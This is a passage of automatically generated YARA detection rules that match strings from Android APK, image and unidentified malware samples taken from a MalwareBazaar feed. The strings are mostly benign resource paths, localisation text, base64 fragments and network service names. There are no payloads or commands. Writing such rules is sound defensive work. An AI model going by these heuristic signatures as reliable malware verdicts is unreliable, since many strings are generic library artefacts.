      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash3 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
      hash4 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s2 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s3 = "--Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s4 = "00RtlOverlay.Widget.AppCompat.Search.DropDown.Text" fullword ascii
      $s5 = "11Base.TextAppearance.AppCompat.Widget.DropDownItem" fullword ascii
      $s6 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Query" fullword ascii
      $s7 = "++Base.Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s8 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s9 = ",,RtlOverlay.Widget.AppCompat.DialogTitle.Icon" fullword ascii
      $s10 = "&&Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s11 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon2" fullword ascii
      $s12 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon1" fullword ascii
      $s13 = "++Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s14 = "((Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
      $s15 = "!!abc_action_bar_elevation_material" fullword ascii
      $s16 = "++Base.Widget.AppCompat.CompoundButton.Switch" fullword ascii
      $s17 = "--Base.Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
      $s18 = "&&Widget.AppCompat.CompoundButton.Switch" fullword ascii
      $s19 = "55Base.TextAppearance.Widget.AppCompat.Toolbar.Subtitle" fullword ascii
      $s20 = "Base.Widget.AppCompat.Button" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e884859_2 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash3 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
   strings:
      $s1 = "Fazer login com o Google" fullword ascii
      $s2 = "Installeer" fullword ascii /* base64 encoded string '"{-jY^z' */
      $s3 = ";;res/drawable/common_google_signin_btn_icon_dark_focused.xml" fullword ascii
      $s4 = "Login dengan Google" fullword ascii
      $s5 = "Fazer login" fullword ascii
      $s6 = ";;res/drawable/common_google_signin_btn_text_dark_focused.xml" fullword ascii
      $s7 = "33res/drawable/common_google_signin_btn_icon_dark.xml" fullword ascii
      $s8 = "33res/drawable/common_google_signin_btn_text_dark.xml" fullword ascii
      $s9 = "::res/drawable/common_google_signin_btn_icon_dark_normal.xml" fullword ascii
      $s10 = "::res/drawable/common_google_signin_btn_text_dark_normal.xml" fullword ascii
      $s11 = "00res/color/common_google_signin_btn_text_dark.xml" fullword ascii
      $s12 = " executado enquanto n" fullword ascii
      $s13 = " executado sem os servi" fullword ascii
      $s14 = "\"\"common_google_signin_btn_text_dark" fullword ascii
      $s15 = "^`%1$s non se executar" fullword ascii
      $s16 = "vel executar o %1$s sem os Servi" fullword ascii
      $s17 = "**common_google_signin_btn_text_dark_pressed" fullword ascii
      $s18 = "\"\"common_google_signin_btn_icon_dark" fullword ascii
      $s19 = "ab%1$s non se executar" fullword ascii
      $s20 = "res/drawable/common_google_signin_btn_icon_dark.xmlPK" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110_b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c7_3 {
   meta:
      description = "evidences - from files 4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110.unknown, b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110"
      hash2 = "b49fac5f49c011afbd02bb1c973259e28d29a027dc48a6b8c0a6a985c74ef4b0"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                 ' */
      $s2 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '             ' */
      $s3 = "FUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQB" ascii /* base64 encoded string 'Q EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
      $s5 = "AAAAAAAABA" ascii /* reversed goodware string 'ABAAAAAAAA' */
      $s6 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s7 = "AABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '  @                                                                                             ' */
      $s8 = "B4AfTFgD65fAOo33B4ge1EgD6VTAOo3EB4geTEgD5xfAOkH/B4geTEgD6dbAOoHTB4QeCHgD59YAOo33B4QeuFgD5xWAOkHTB4ggIGgDCiYAOIIPB4wgkGgDBudAOE4A" ascii
      $s9 = "sYkxzuiRGfiKGZcspYkxjgiRG/0JGZsLmYkxNViRGjNJGZ8SjYkxlLiRGnUIGZs5gYkxH9hRGbiHGZcRdYkxXzhRGP0GGZ86aYkxBlhRGDCGGZ8XXYkxHbhRG3VFGZsz" ascii
      $s10 = "tFgD55gsjhZQA0c3tBQzd3GETpTNB6aagNnMnGlwKJnzkrgzL4W26mSzvYbXNElsLRg1IVatiuW8DerTgDGw3HgDCyfAOIoqGqmC9EgDCyfAOII//GYC/a9KyUu5iObe" ascii
      $s11 = "ElRxAQUGFDARZANAElReAQUGgBARaIAAElh8AQUGtAARacBAAAAAAAAAAIC00LzJSVgoMorPAhMcedO/LOG0yIlM8WsIiUXVqOSgJ/TuJZON2cXqNTxyuulS2MpQeIvb" ascii
      $s12 = "EKv7VGLeBhRmYsRurl38wKN2XEfJ3GeyewD31p4vPO3IL52eZ3UNIyChvHZAxz6si/a23q4ZhO6JjnWhr/DqDmSh8pmSzr9fKZnwKTP7EXlevKl7EALiossW8yaaUfKA" ascii
      $s13 = "QAjBAAAAMDwAwBAAA8D//I/Po/j3/Q9PK/Dw/Y7PserTgDjo/g5POerTgDDh/o3Pw9jZ/w1PS9DS/4zP08jK/AyPW8DD/IgP47j7erTgDQuPa7D0erTgDYsPy6jg6UMO" ascii
      $s14 = "DV46AMkdFAwQ6NIADpYhAM0faBwQ7NFAD9nWAMkevDwQ/pFADZIWAM0g1DwQ7tHADlY3AMEiRCwQ61BAD13KAMUfPBwQIWLADp3pAMkhADwQKeMADhW9AMEaXCwQr1PA" ascii
      $s15 = "IRTP0cyMyPT4z08MCPzpzI3MmNzUzg0MerTgDMzMz8hM9LD2ycsMVJzTy0hMPEzDwkHMuBjWw8EAAAAwAAA0A8D6/09PG/Dp/kwPD4z9erTgDUtP36DrerTgDoZPD1DO" ascii
      $s16 = "AAAAaAAAAA" ascii /* base64 encoded string '   h   ' */
      $s17 = "GyWpx4gxZmxkxGYLS2OAtrEFK84MerTgDlnK0hbCWuNzRnZyuMRKkn79dzgLZ1ZBAiTmPHaq93dkmg3rwWaOjMaUMRpHWyTskV7OBcCGDGwJWcehVv5mBcCD6GwJYMo2" ascii
      $s18 = "zA4M8NDezQ3MwNDbzg2MkNDYzw1MYNDVzA1MMNDSzQ0MANDPzgzM0MDMzwyMoMDJzAyMcMDGzQxMQMDDzgwMEMDAywvM4LD9yAvMsLD6yQuMgLD3ygtMULD0ywsMILDx" ascii
      $s19 = "ucPKlDgU/JMASd33gherTgDJ7MSIPHJp9NjIAI1fCDgU3hFLDF5Msx6Awt9XB6xGbm1OAmntGzOzSQJMwXxqbAKZhkeYCIEb2Unk5uVBuTSwcD6YXPvCpBK7O6Q67Z8E" ascii
      $s20 = "oMDJzAyMcMDGzQxMQMDDzgwMEMDAywvM4LD9yAvMsLD6yQuMgLD3ygtMULD0ywsMILDxyAsM8KDuyQrMwKDrygqMkKDoywpMYKDlyApMMKDiyQoMAKDfygnM0JDcywmM" ascii
   condition:
      ( uint16(0) == 0x3d3d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _42c9e28bbd2664f392239112d780d7976ede49729330c9596e44d7475308bf39_78372bae606f77e310750a376a73f83aaa2bdd0a256144f72050b079b0_4 {
   meta:
      description = "evidences - from files 42c9e28bbd2664f392239112d780d7976ede49729330c9596e44d7475308bf39.img, 78372bae606f77e310750a376a73f83aaa2bdd0a256144f72050b079b023b7e9.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "42c9e28bbd2664f392239112d780d7976ede49729330c9596e44d7475308bf39"
      hash2 = "78372bae606f77e310750a376a73f83aaa2bdd0a256144f72050b079b023b7e9"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "klogin" fullword wide
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s4 = "nameserver" fullword wide
      $s5 = "Cannot listen on an unusable interface. Check the IsUsable property before attemping to bind." fullword wide
      $s6 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s7 = "remotefs" fullword wide
      $s8 = ".NET Framework 4.5A" fullword ascii
      $s9 = "kshell" fullword wide
      $s10 = "Cannot multicast on an unusable interface. Check the IsUsable property before attemping to connect." fullword wide
      $s11 = "<GetConnectedInterfaceAsync>d__11" fullword ascii
      $s12 = "hosts2-ns" fullword wide
      $s13 = "ftps-data" fullword wide
      $s14 = "nicname" fullword wide
      $s15 = "rtelnet" fullword wide
      $s16 = "sqlserv" fullword wide
      $s17 = "conference" fullword wide
      $s18 = "netnews" fullword wide
      $s19 = "afpovertcp" fullword wide
      $s20 = "telnets" fullword wide
   condition:
      ( uint16(0) == 0x0000 and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef_24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76_5 {
   meta:
      description = "evidences - from files 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash2 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
      hash3 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "$$item_touch_helper_previous_elevation" fullword ascii
      $s2 = "66RtlOverlay.Widget.AppCompat.PopupMenuItem.SubmenuArrow" fullword ascii
      $s3 = "22RtlOverlay.Widget.AppCompat.PopupMenuItem.Shortcut" fullword ascii
      $s4 = "&&res/layout/preference_recyclerview.xml" fullword ascii
      $s5 = "error_color_material_dark" fullword ascii
      $s6 = "cardMaxElevation" fullword ascii
      $s7 = "cardview_default_elevation" fullword ascii
      $s8 = "))res/layout/preference_widget_checkbox.xml" fullword ascii
      $s9 = "))res/layout/preference_dialog_edittext.xml" fullword ascii
      $s10 = "Preference.DialogPreference" fullword ascii
      $s11 = "res/layout/preference_widget_switch_compat.xmlPK" fullword ascii
      $s12 = "((res/layout/preference_widget_seekbar.xml" fullword ascii
      $s13 = "''res/layout/preference_widget_switch.xml" fullword ascii
      $s14 = "cardElevation" fullword ascii
      $s15 = "res/layout/preference_widget_seekbar.xml" fullword ascii
      $s16 = "77Preference.DialogPreference.EditTextPreference.Material" fullword ascii
      $s17 = "res/layout/preference_dialog_edittext.xml" fullword ascii
      $s18 = "//RtlOverlay.Widget.AppCompat.PopupMenuItem.Title" fullword ascii
      $s19 = "res/layout/preference_widget_switch_compat.xmlu" fullword ascii
      $s20 = "res/layout/preference_recyclerview.xmlu" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e884859_6 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
   strings:
      $s1 = "QQres/drawable-xxhdpi-v4/common_google_signin_btn_text_dark_normal_background.9.png" fullword ascii
      $s2 = "QQres/drawable-xxhdpi-v4/common_google_signin_btn_icon_dark_normal_background.9.png" fullword ascii
      $s3 = "AAres/drawable-xxhdpi-v4/abc_text_select_handle_right_mtrl_dark.png" fullword ascii
      $s4 = "res/drawable-xxhdpi-v4/abc_text_select_handle_right_mtrl_dark.png" fullword ascii
      $s5 = "BBres/drawable-xxhdpi-v4/abc_text_select_handle_middle_mtrl_dark.png" fullword ascii
      $s6 = "@@res/drawable-xxhdpi-v4/abc_text_select_handle_left_mtrl_dark.png" fullword ascii
      $s7 = "res/drawable-xxhdpi-v4/common_google_signin_btn_text_dark_normal_background.9.pngPK" fullword ascii
      $s8 = "res/drawable-xxhdpi-v4/abc_text_select_handle_middle_mtrl_dark.png" fullword ascii
      $s9 = "res/layout-v16/notification_template_custom_big.xml" fullword ascii
      $s10 = "77res/drawable-xxhdpi-v4/abc_ic_menu_share_mtrl_alpha.png" fullword ascii
      $s11 = "RRres/drawable-xxhdpi-v4/common_google_signin_btn_icon_light_normal_background.9.png" fullword ascii
      $s12 = "33res/drawable-xhdpi-v4/common_full_open_on_phone.png" fullword ascii
      $s13 = "33res/layout-v16/notification_template_custom_big.xml" fullword ascii
      $s14 = "play-services-ads-identifier.propertiesPK" fullword ascii
      $s15 = "RRres/drawable-xxhdpi-v4/common_google_signin_btn_text_light_normal_background.9.png" fullword ascii
      $s16 = "play-services-ads-identifier.properties+K-*" fullword ascii
      $s17 = "res/drawable-xhdpi-v4/common_full_open_on_phone.png" fullword ascii
      $s18 = "primary_dark" fullword ascii
      $s19 = "  abc_font_family_subhead_material" fullword ascii
      $s20 = "&&abc_text_select_handle_right_mtrl_dark" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa45229_7 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "??res/drawable-hdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s2 = "55res/drawable-mdpi-v4/abc_list_pressed_holo_dark.9.png" fullword ascii
      $s3 = "??res/drawable-mdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s4 = "res/drawable-mdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s5 = "@@res/drawable-xhdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s6 = "55res/drawable-hdpi-v4/abc_list_pressed_holo_dark.9.png" fullword ascii
      $s7 = "66res/drawable-xhdpi-v4/abc_list_pressed_holo_dark.9.png" fullword ascii
      $s8 = "<<res/drawable-mdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s9 = "res/drawable-hdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s10 = "<<res/drawable-xhdpi-v4/abc_menu_hardkey_panel_mtrl_mult.9.png" fullword ascii
      $s11 = "res/drawable-xhdpi-v4/abc_ab_share_pack_mtrl_alpha.9.png" fullword ascii
      $s12 = "77res/drawable-mdpi-v4/abc_ab_share_pack_mtrl_alpha.9.png" fullword ascii
      $s13 = "okhttp3/internal/publicsuffix/publicsuffixes.gzPK" fullword ascii
      $s14 = "==res/drawable-xhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s15 = "res/drawable-xhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s16 = "88res/drawable-xhdpi-v4/abc_ab_share_pack_mtrl_alpha.9.png" fullword ascii
      $s17 = ";;res/drawable-hdpi-v4/abc_menu_hardkey_panel_mtrl_mult.9.png" fullword ascii
      $s18 = ";;res/drawable-mdpi-v4/abc_menu_hardkey_panel_mtrl_mult.9.png" fullword ascii
      $s19 = "<<res/drawable-hdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s20 = "77res/drawable-hdpi-v4/abc_ab_share_pack_mtrl_alpha.9.png" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76_8 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
   strings:
      $s1 = "res/color/common_google_signin_btn_text_dark.xml" fullword ascii
      $s2 = "res/drawable/common_google_signin_btn_text_dark.xml" fullword ascii
      $s3 = "res/drawable/common_google_signin_btn_icon_dark.xml" fullword ascii
      $s4 = "res/drawable/common_google_signin_btn_text_dark_normal.xml" fullword ascii
      $s5 = "res/drawable/common_google_signin_btn_icon_dark_focused.xmlu" fullword ascii
      $s6 = "res/drawable/common_google_signin_btn_text_dark_focused.xmlu" fullword ascii
      $s7 = "<<res/layout/notification_template_big_media_narrow_custom.xml" fullword ascii
      $s8 = "res/drawable/common_google_signin_btn_icon_light.xml" fullword ascii
      $s9 = "11res/layout/notification_template_media_custom.xml" fullword ascii
      $s10 = "res/layout/notification_template_big_media.xml" fullword ascii
      $s11 = "//res/layout/notification_template_custom_big.xml" fullword ascii
      $s12 = "res/drawable/common_google_signin_btn_text_light.xml" fullword ascii
      $s13 = "res/layout/notification_template_custom_big.xml" fullword ascii
      $s14 = "res/drawable/common_google_signin_btn_icon_disabled.xml" fullword ascii
      $s15 = "00res/layout/notification_template_lines_media.xml" fullword ascii
      $s16 = "res/layout/notification_template_big_media_narrow_custom.xml" fullword ascii
      $s17 = "55res/layout/notification_template_big_media_narrow.xml" fullword ascii
      $s18 = "**res/layout/notification_template_media.xml" fullword ascii
      $s19 = "res/drawable/common_google_signin_btn_text_light_normal.xml" fullword ascii
      $s20 = "res/layout/notification_template_big_media_narrow.xml" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76_9 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "24ef1bdbb71aba9f8c50b5df76df9bd7c0f6782a50ef5caacbb3075f76845340"
      hash3 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "res/color/abc_secondary_text_material_dark.xmluP" fullword ascii
      $s2 = "saugoti" fullword ascii
      $s3 = "Nenastaven" fullword ascii
      $s4 = "Salvesta" fullword ascii
      $s5 = "Elimina" fullword ascii
      $s6 = " povolen" fullword ascii
      $s7 = "in dokunun" fullword ascii
      $s8 = "czenia" fullword ascii
      $s9 = "Y[@BDFHJLNPRTVXZ\\^aBeFiJmNqRuVyZ}" fullword ascii
      $s10 = "IDAT8" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "kalimin" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "Shrani" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "Opslaan" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "Tallenna" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "#IDAT(" fullword ascii /* Goodware String - occured 1 times */
      $s16 = "Salvar" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "Zapisz" fullword ascii /* Goodware String - occured 1 times */
      $s18 = "res/drawable/abc_ic_voice_search_api_material.xmluR" fullword ascii
      $s19 = "insetForeground" fullword ascii
      $s20 = ")IDAT(" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x4b50 and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478_228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e884859_10 {
   meta:
      description = "evidences - from files 21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478.apk, 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "21b9ee90d26b44f4044fd53567cddfe6d17317ee8ed9d6131f92b2a56ce36478"
      hash2 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash3 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "res/layout-watch-v20/abc_alert_dialog_button_bar_material.xml" fullword ascii
      $s2 = "99res/drawable-watch-v20/abc_dialog_material_background.xml" fullword ascii
      $s3 = "77res/drawable-xxhdpi-v4/abc_list_pressed_holo_dark.9.png" fullword ascii
      $s4 = "res/layout-watch-v20/abc_alert_dialog_title_material.xml" fullword ascii
      $s5 = "AAres/drawable-xxhdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s6 = "==res/layout-watch-v20/abc_alert_dialog_button_bar_material.xml" fullword ascii
      $s7 = "88res/layout-watch-v20/abc_alert_dialog_title_material.xml" fullword ascii
      $s8 = "33res/layout-v21/notification_template_custom_big.xml" fullword ascii
      $s9 = ">>res/drawable-xxhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s10 = "33res/layout-v21/notification_template_icon_group.xml" fullword ascii
      $s11 = "res/layout-v21/notification_template_custom_big.xml" fullword ascii
      $s12 = "99res/drawable-xxhdpi-v4/abc_ab_share_pack_mtrl_alpha.9.png" fullword ascii
      $s13 = "==res/drawable-xxhdpi-v4/abc_menu_hardkey_panel_mtrl_mult.9.png" fullword ascii
      $s14 = "res/layout-watch-v20/abc_alert_dialog_button_bar_material.xmlPK" fullword ascii
      $s15 = "res/layout-watch-v20/abc_alert_dialog_title_material.xmlPK" fullword ascii
      $s16 = "res/drawable-watch-v20/abc_dialog_material_background.xmlPK" fullword ascii
      $s17 = "88res/drawable-xxhdpi-v4/abc_switch_track_mtrl_alpha.9.png" fullword ascii
      $s18 = "::res/color-v21/abc_btn_colored_borderless_text_material.xml" fullword ascii
      $s19 = "res/drawable-v21/abc_btn_colored_material.xml" fullword ascii
      $s20 = "::res/drawable-xxhdpi-v4/abc_scrubber_track_mtrl_alpha.9.png" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef_4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa45229_11 {
   meta:
      description = "evidences - from files 228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef.apk, 4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "228e715b42f28f3224f7706a6f68fb72c7a5797760212e0a706e8848598579ef"
      hash2 = "4526effc1cd2597885c2787b1ca78a73ef17e066028a660ae70aa452292dc564"
   strings:
      $s1 = "META-INF/androidx.loader_loader.version" fullword ascii
      $s2 = "META-INF/androidx.recyclerview_recyclerview.version" fullword ascii
      $s3 = "res/drawable-xxhdpi-v4/abc_list_pressed_holo_dark.9.png" fullword ascii
      $s4 = "33res/drawable-v21/abc_dialog_material_background.xml" fullword ascii
      $s5 = "res/drawable-xxhdpi-v4/abc_list_selector_disabled_holo_dark.9.png" fullword ascii
      $s6 = "META-INF/androidx.appcompat_appcompat.versionPK" fullword ascii
      $s7 = "META-INF/androidx.arch.core_core-runtime.versionPK" fullword ascii
      $s8 = "META-INF/androidx.legacy_legacy-support-core-utils.version" fullword ascii
      $s9 = "res/drawable-xxhdpi-v4/abc_ab_share_pack_mtrl_alpha.9.png" fullword ascii
      $s10 = "res/drawable-xxhdpi-v4/abc_menu_hardkey_panel_mtrl_mult.9.png" fullword ascii
      $s11 = "META-INF/androidx.lifecycle_lifecycle-runtime.version" fullword ascii
      $s12 = "res/drawable-xxhdpi-v4/abc_ic_commit_search_api_mtrl_alpha.png" fullword ascii
      $s13 = "res/drawable-v21/abc_dialog_material_background.xmlu" fullword ascii
      $s14 = "res/drawable-v21/abc_dialog_material_background.xmlPK" fullword ascii
